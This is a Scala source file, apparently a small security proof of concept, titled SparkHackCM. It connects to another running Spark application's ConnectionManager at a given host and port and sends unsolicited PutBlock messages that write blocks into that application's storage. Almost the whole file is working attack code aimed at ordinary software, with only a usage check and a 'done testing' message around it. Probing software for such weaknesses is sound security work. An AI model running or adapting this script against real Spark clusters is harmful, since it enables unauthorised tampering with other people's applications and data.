// put in spark packages so we can access internal spark functions
package org.apache.spark.network.nio

import java.nio.ByteBuffer
import java.net.InetAddress
import org.apache.spark._
import org.apache.spark.network._
import org.apache.spark.network.nio._
import org.apache.spark.storage._
import scala.concurrent.{Await, ExecutionContext, Future, Promise}

import scala.concurrent.duration._

/** tries to hack into another running Spark app ConnectionManager */
object SparkHackCM extends Logging {

  def main(args: Array[String]) {
    if (args.length < 2) {
      System.err.println("Usage: SparkHackCM targethost targetport")
      System.exit(1)
    }

    val targetHost = args(0)
    val targetPort = args(1).toInt

    val targetConnectionManagerId = new ConnectionManagerId(targetHost, targetPort)
    val conf = new SparkConf
    val manager = new ConnectionManager(0, conf, new SecurityManager(conf))
    println("Started connection manager with id = " + manager.id)

    manager.onReceiveMessage((msg: Message, id: ConnectionManagerId) => {
      System.err.println("Received [" + msg + "] from [" + id + "]")
      None    })

    val size =  100 * 1024  * 1024
    val buffer = ByteBuffer.allocate(size).put(Array.tabulate[Byte](size)(x => x.toByte))
    buffer.flip

    val targetServer = args(0)

    val count = 1
    (0 until count).foreach(i => {
      val blockMessages =
        (0 until 10).map { i =>
            val buffer =  ByteBuffer.allocate(100)
            buffer.clear
            val nioBuffer = new NioByteBufferManagedBuffer(buffer)
            BlockMessage.fromPutBlock(PutBlock(TestBlockId(i.toString), 
              nioBuffer.nioByteBuffer(), StorageLevel.MEMORY_ONLY_SER))
      }
      val blockMessageArray = new BlockMessageArray(blockMessages)

      val bufferMessage = blockMessageArray.toBufferMessage

      val f = manager.sendMessageReliably(targetConnectionManagerId, bufferMessage)

      f.onFailure {
        case e =>  {
          System.err.println("Failed due to " + e)
          System.exit(1)
        }
      }(manager.futureExecContext)

      Await.result(f, 35 seconds) 

    })
    System.err.println("done testing")

    System.exit(0)
  }
}
